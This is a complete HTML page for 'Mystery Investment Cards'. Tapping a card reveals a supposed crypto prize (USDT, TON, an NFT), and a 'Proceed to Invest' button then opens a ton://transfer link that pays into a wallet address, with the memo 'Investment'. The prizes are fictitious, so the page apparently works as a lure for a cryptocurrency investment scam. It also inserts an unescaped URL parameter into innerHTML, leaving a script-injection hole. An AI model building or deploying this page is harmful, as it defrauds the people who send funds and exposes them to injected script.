<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Mystery Cards</title>

<style>
body {
  margin: 0;
  background: radial-gradient(circle at top, #0f172a, #020617);
  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
  color: #e5e7eb;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.container {
  width: 100%;
  max-width: 420px;
  padding: 20px;
  text-align: center;
}

h1 {
  font-size: 22px;
  margin-bottom: 6px;
}

.sub {
  font-size: 13px;
  color: #94a3b8;
  margin-bottom: 20px;
}

.cards {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 14px;
}

.card {
  perspective: 1000px;
  cursor: pointer;
}

.card-inner {
  width: 100%;
  aspect-ratio: 2 / 3;
  position: relative;
  transform-style: preserve-3d;
  transition: transform 0.8s cubic-bezier(.25,.8,.25,1);
}

.card.flipped .card-inner {
  transform: rotateY(180deg);
}

.card-face {
  position: absolute;
  inset: 0;
  border-radius: 14px;
  backface-visibility: hidden;
  display: flex;
  align-items: center;
  justify-content: center;
  font-weight: 600;
}

.card-back {
  background: linear-gradient(135deg, #1e293b, #020617);
  border: 1px solid #334155;
  font-size: 26px;
}

.card-front {
  transform: rotateY(180deg);
  background: linear-gradient(135deg, #020617, #020617);
  border: 1px solid #22c55e;
  color: #22c55e;
  flex-direction: column;
}

.reward-title {
  font-size: 14px;
  opacity: 0.8;
}

.reward-value {
  font-size: 22px;
  margin-top: 6px;
}

.cta {
  margin-top: 22px;
  display: none;
}

button {
  width: 100%;
  padding: 14px;
  border-radius: 10px;
  border: none;
  background: linear-gradient(135deg, #22c55e, #16a34a);
  color: #020617;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
}

button:active {
  transform: scale(0.98);
}
</style>
</head>

<body>
<div class="container">
  <h1>Mystery Investment Cards</h1>
  <div class="sub">Tap one card to reveal a potential reward</div>

  <div class="cards" id="cards"></div>

  <div class="cta" id="cta">
    <button id="investBtn">Proceed to Invest</button>
  </div>
</div>

<script>
const urlParams = new URLSearchParams(window.location.search);
const rewardAmount = urlParams.get("reward") || "5.7";

const rewards = [
  { type: "NFT", label: "Valuable NFT" },
  { type: "USDT", label: "1000 USDT" },
  { type: "DOGS", label: "500 DOGS" },
  { type: "TON", label: `${rewardAmount} TON` },
  { type: "DEDUST", label: "300 DeDust" },
  { type: "ECORE", label: "500 Ecorepay" }
];

// shuffle cards
rewards.sort(() => Math.random() - 0.5);

const cardsEl = document.getElementById("cards");
let flipped = false;

rewards.forEach((reward) => {
  const card = document.createElement("div");
  card.className = "card";

  card.innerHTML = `
    <div class="card-inner">
      <div class="card-face card-back">ðŸ‚ </div>
      <div class="card-face card-front">
        <div class="reward-title">${reward.type}</div>
        <div class="reward-value">${reward.label}</div>
      </div>
    </div>
  `;

  card.onclick = () => {
    if (flipped) return;
    flipped = true;

    card.classList.add("flipped");
    document.getElementById("cta").style.display = "block";
  };

  cardsEl.appendChild(card);
});

document.getElementById("investBtn").onclick = () => {
  window.location.href =
    "ton://transfer/EQC9...xA7P?text=Investment";
};
</script>
</body>
</html>
